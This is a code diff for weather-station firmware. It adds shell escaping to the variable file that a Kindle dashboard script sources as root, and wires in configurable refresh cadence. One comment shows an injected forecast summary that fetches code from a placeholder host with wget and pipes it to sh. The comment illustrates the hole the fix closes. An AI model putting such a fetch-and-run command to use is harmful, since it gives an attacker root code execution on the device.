@@ -536,6 +536,41 @@ void handleKindleGraph(AsyncWebServerRequest* req) {
 // ---------------------------------------------------------------------------
 
 
+// Emit one KEY="value" line with the value escaped for a POSIX shell.
+//
+// THE CONSUMER OF THIS FILE IS `.` — kindle/update_dash.sh sources it, as root,
+// on a device with no security model to speak of. So every byte on the right of
+// the `=` is code unless something makes it data, and one of the values is the
+// forecast provider's free-text summary: an upstream API's string, or anything
+// that can answer for it on an unencrypted link. A summary of
+//
+//     "; wget -O - http://x/y | sh; #
+//
+// is a shell command on the reader, not a weather description.
+//
+// Backslash-escaping the four characters that keep their meaning inside double
+// quotes ("  \  $  `) makes the value inert; control characters are dropped
+// outright because a newline would end the assignment whatever is escaped, and
+// none of them belong in a label.
+static void kdShellVar(AsyncResponseStream* s, const char* key, const char* val) {
+    s->print(key);
+    s->print("=\"");
+    for (const char* p = val; p && *p; p++) {
+        const unsigned char c = (unsigned char)*p;
+        if (c < 0x20 || c == 0x7F) continue;
+        if (c == '"' || c == '\\' || c == '$' || c == '`') s->print('\\');
+        s->write(c);
+    }
+    s->print("\"\n");
+}
+
+/// The same, for the indexed keys (FC0_LABEL, WK3_NAME…).
+static void kdShellVarN(AsyncResponseStream* s, const char* fmt, int i, const char* val) {
+    char key[24];
+    snprintf(key, sizeof(key), fmt, i);
+    kdShellVar(s, key, val);
+}
+
 static void handleKindleData(AsyncWebServerRequest* req) {
     const Latest outT = latestOf(outdoorSensorId(), "temperature");
     const Latest outH = humidityOf(outdoorSensorId());
@@ -560,7 +595,7 @@ static void handleKindleData(AsyncWebServerRequest* req) {
 
     // ── Outdoor ──
     fmtTemp(buf, sizeof(buf), outT.value, skin.tempDecimals);
-    s->printf("OUT_TEMP=\"%s\"\n", outT.ok ? buf : "--");
+    kdShellVar(s, "OUT_TEMP", outT.ok ? buf : "--");
     s->printf("OUT_HUM=%d\n", outH.ok ? (int)roundf(outH.value) : -1);
     
     if (outP.ok) {
@@ -568,8 +603,8 @@ static void handleKindleData(AsyncWebServerRequest* req) {
         const int pd = kdPressureDecimals(skin.pressureUnit);
         if (pd) snprintf(buf, sizeof(buf), "%.*f", pd, (double)pv);
         else    fmtInt(buf, sizeof(buf), pv);
-        s->printf("OUT_PRES=\"%s\"\n", buf);
-        s->printf("OUT_PRES_UNIT=\"%s\"\n", kdPressureUnitLabel(skin.pressureUnit));
+        kdShellVar(s, "OUT_PRES", buf);
+        kdShellVar(s, "OUT_PRES_UNIT", kdPressureUnitLabel(skin.pressureUnit));
     } else {
         s->print("OUT_PRES=\"--\"\nOUT_PRES_UNIT=\"\"\n");
     }
@@ -577,7 +612,7 @@ static void handleKindleData(AsyncWebServerRequest* req) {
     if (haveP) {
         const Tendency t = pressureTendency(tPress);
         if (t.have) {
-            s->printf("OUT_TEND=\"%s\"\n", t.word);
+            kdShellVar(s, "OUT_TEND", t.word);
             const char* arrows[] = {"↑", "↗", "→", "↘", "↓"};
             int ai = 2; // steady default
             if (t.delta >= 1.6f) ai = 0;
@@ -585,7 +620,7 @@ static void handleKindleData(AsyncWebServerRequest* req) {
             else if (t.delta > -0.5f) ai = 2;
             else if (t.delta > -1.6f) ai = 3;
             else ai = 4;
-            s->printf("OUT_TEND_ARROW=\"%s\"\n", arrows[ai]);
+            kdShellVar(s, "OUT_TEND_ARROW", arrows[ai]);
             const float dv = kdPressureValue(t.delta, skin.pressureUnit);
             const int ddec = kdPressureDecimals(skin.pressureUnit) + 1;
             s->printf("OUT_TEND_DELTA=\"%+.*f\"\n", ddec, (double)dv);
@@ -607,9 +642,9 @@ static void handleKindleData(AsyncWebServerRequest* req) {
     }
     if (mn <= mx) {
         fmtTemp(buf, sizeof(buf), mn, skin.tempDecimals);
-        s->printf("OUT_RANGE_LO=\"%s\"\n", buf);
+        kdShellVar(s, "OUT_RANGE_LO", buf);
         fmtTemp(buf, sizeof(buf), mx, skin.tempDecimals);
-        s->printf("OUT_RANGE_HI=\"%s\"\n", buf);
+        kdShellVar(s, "OUT_RANGE_HI", buf);
     } else {
         s->print("OUT_RANGE_LO=\"\"\nOUT_RANGE_HI=\"\"\n");
     }
@@ -628,7 +663,7 @@ static void handleKindleData(AsyncWebServerRequest* req) {
 
     // ── Indoor ──
     fmtTemp(buf, sizeof(buf), inT.value, skin.tempDecimals);
-    s->printf("IN_TEMP=\"%s\"\n", inT.ok ? buf : "--");
+    kdShellVar(s, "IN_TEMP", inT.ok ? buf : "--");
     s->printf("IN_HUM=%d\n", inH.ok ? (int)roundf(inH.value) : -1);
     if (inA.ok) s->printf("IN_AQI=%d\n", (int)roundf(inA.value));
     else s->print("IN_AQI=\n");
@@ -643,8 +678,12 @@ static void handleKindleData(AsyncWebServerRequest* req) {
         time_t t = (time_t)now;
         localtime_r(&t, &tm);
         s->printf("CLOCK=\"%02d:%02d\"\n", tm.tm_hour, tm.tm_min);
-        s->printf("DATE=\"%d %s\"\n", tm.tm_mday, kdMonth(tm.tm_mon));
-        s->printf("MONTH_LABEL=\"%s\"\n", kdMonth(tm.tm_mon));
+        {
+            char dbuf[32];
+            snprintf(dbuf, sizeof(dbuf), "%d %s", tm.tm_mday, kdMonth(tm.tm_mon));
+            kdShellVar(s, "DATE", dbuf);
+        }
+        kdShellVar(s, "MONTH_LABEL", kdMonth(tm.tm_mon));
         s->printf("YEAR=%d\n", tm.tm_year + 1900);
 
         int wday = (tm.tm_wday + 6) % 7; // 0=Mon..6=Sun
@@ -653,27 +692,30 @@ static void handleKindleData(AsyncWebServerRequest* req) {
             time_t day = monday + i * 86400;
             struct tm dtm;
             localtime_r(&day, &dtm);
-            s->printf("WK%d_NAME=\"%s\"\n", i, kdWeekdayShort(i));
+            kdShellVarN(s, "WK%d_NAME", i, kdWeekdayShort(i));
             s->printf("WK%d_DAY=%d\n", i, dtm.tm_mday);
         }
         s->printf("WK_TODAY=%d\n", wday);
     } else {
         s->print("CLOCK=\"--:--\"\nDATE=\"\"\nMONTH_LABEL=\"\"\nYEAR=\n");
         for (int i = 0; i < 7; i++)
-            s->printf("WK%d_NAME=\"%s\"\nWK%d_DAY=\n", i, kdWeekdayShort(i), i);
+        {
+            kdShellVarN(s, "WK%d_NAME", i, kdWeekdayShort(i));
+            s->printf("WK%d_DAY=\n", i);
+        }
         s->print("WK_TODAY=-1\n");
     }
 
     // ── Forecast ──
     #ifdef MODULE_FORECAST_ENABLED
     const auto& fc = forecastModule.snapshot();
-    s->printf("FC_SUMMARY=\"%s\"\n", fc.summary);
+    kdShellVar(s, "FC_SUMMARY", fc.summary);
     s->printf("FC_CODE=%d\n", fc.code);
     s->printf("FC_HIGH=%d\n", (int)roundf(fc.highC));
     s->printf("FC_LOW=%d\n", (int)roundf(fc.lowC));
     s->printf("FC_WIND=%d\n", (int)roundf(fc.windKph));
     for (int i = 0; i < 3; i++) {
-        s->printf("FC%d_LABEL=\"%s\"\n", i, fc.outlook[i].label);
+        kdShellVarN(s, "FC%d_LABEL", i, fc.outlook[i].label);
         s->printf("FC%d_CODE=%d\n", i, fc.outlook[i].code);
         s->printf("FC%d_TEMP=%d\n", i, (int)roundf(fc.outlook[i].tempC));
         if (!isnan(fc.outlook[i].lowC))
@@ -688,21 +730,21 @@ static void handleKindleData(AsyncWebServerRequest* req) {
     #endif
 
     // ── UI labels ──
-    s->printf("LBL_OUTSIDE=\"%s\"\n", KD_T("OUTSIDE", "НАВЪН"));
-    s->printf("LBL_INSIDE=\"%s\"\n", KD_T("INSIDE", "ВЪТРЕ"));
-    s->printf("LBL_LAST24=\"%s\"\n", KD_T("LAST 24 HOURS", "ПОСЛЕДНИТЕ 24 ЧАСА"));
-    s->printf("LBL_FORECAST=\"%s\"\n", KD_T("FORECAST", "ПРОГНОЗА"));
-    s->printf("LBL_MEASURED=\"%s\"\n", KD_T("Measured on site", "Измерено на място"));
-    s->printf("LBL_NO_READING=\"%s\"\n", KD_T("no reading", "няма данни"));
-    s->printf("LBL_WIND=\"%s\"\n", KD_T("wind", "вятър"));
-    s->printf("LBL_TO=\"%s\"\n", KD_T("to", "до"));
+    kdShellVar(s, "LBL_OUTSIDE", KD_T("OUTSIDE", "НАВЪН"));
+    kdShellVar(s, "LBL_INSIDE", KD_T("INSIDE", "ВЪТРЕ"));
+    kdShellVar(s, "LBL_LAST24", KD_T("LAST 24 HOURS", "ПОСЛЕДНИТЕ 24 ЧАСА"));
+    kdShellVar(s, "LBL_FORECAST", KD_T("FORECAST", "ПРОГНОЗА"));
+    kdShellVar(s, "LBL_MEASURED", KD_T("Measured on site", "Измерено на място"));
+    kdShellVar(s, "LBL_NO_READING", KD_T("no reading", "няма данни"));
+    kdShellVar(s, "LBL_WIND", KD_T("wind", "вятър"));
+    kdShellVar(s, "LBL_TO", KD_T("to", "до"));
 
     // ── Metadata ──
     const uint16_t resW = skin.fbinkResW ? skin.fbinkResW : (uint16_t)KINDLE_PAGE_W;
     const uint16_t resH = (resW > 600) ? 1448 : 800;
     s->printf("RES_W=%u\n", resW);
     s->printf("RES_H=%u\n", resH);
-    s->printf("LANG=\"%s\"\n", KD_T("en", "bg"));
+    kdShellVar(s, "LANG", KD_T("en", "bg"));
     s->printf("DECIMALS=%d\n", skin.tempDecimals);
     s->printf("CLOCK_STYLE=%d\n", skin.clockStyle);
     s->printf("SHOW_FLAGS=%u\n", skin.showFlags);
@@ -746,8 +788,18 @@ static void handleKindle(AsyncWebServerRequest* req) {
     // The clock only makes its once-a-minute demand when it is actually drawn
     // — an unsynced device prints "clock not set" and has nothing to keep
     // fresh, so it must be allowed to back off like any other stale source.
+    // The stored cadence, with the compile-time knobs as the defaults. 0 and
+    // 0xFF are the "not configured" sentinels — see KindleConfig — so a device
+    // that has never opened the settings form behaves exactly as it did before
+    // the fields existed.
+    KdCadence cad;
+    if (skin.refreshSec)             cad.refreshSec      = skin.refreshSec;
+    if (skin.followData != 0xFF)     cad.followData      = (skin.followData != 0);
+    if (skin.clockPinRefresh != 0xFF) cad.clockPinRefresh = (skin.clockPinRefresh != 0);
+    cad.clamp();
+
     p += kdRefreshDelaySec(outT.ts > inT.ts ? outT.ts : inT.ts, now,
-                           now > KINDLE_MIN_REAL_TS);
+                           now > KINDLE_MIN_REAL_TS, cad);
     p += F("\"><title>" KD_T("Weather", "Времето") "</title><style>");
 
     // The stylesheet, emitted rather than stored as one literal: every number
